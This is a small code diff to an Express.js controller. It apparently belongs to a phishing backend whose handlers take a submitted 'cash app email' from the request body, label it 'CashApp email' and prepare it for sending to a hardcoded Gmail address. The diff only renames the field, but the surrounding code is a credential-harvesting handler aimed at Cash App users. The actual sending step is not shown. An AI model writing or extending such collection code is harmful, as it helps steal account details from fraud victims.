@@ -49,11 +49,11 @@ exports.mobile = (req, res) => {
 }
 
 exports.email = (req, res) => {
-    const { email } = req.body;
+    const { emails } = req.body;
     console.log(req.body)
 
     try {
-        const message = `cash app email:${email}`
+        const message = `cash app email:${emails}`
         console.log(message)
         const reason = 'CashApp email'
         const email = 'techt5562@gmail.com'
